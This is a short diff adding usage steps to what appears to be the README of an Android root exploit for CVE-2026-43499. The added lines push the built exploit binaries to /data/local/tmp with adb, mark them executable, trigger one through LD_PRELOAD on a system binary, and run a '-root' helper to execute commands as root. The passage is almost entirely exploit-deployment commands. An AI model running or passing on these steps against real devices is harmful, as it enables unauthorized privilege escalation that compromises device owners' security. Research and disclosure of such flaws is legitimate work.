@@ -50,6 +50,12 @@ build/<profile>/cve-2026-43499-app.so
 build/<profile>/cve-2026-43499-root
 ```
 
+adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499
+adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
+adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
+adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
+adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
+
 The release app payload is built with:
 
 ```sh
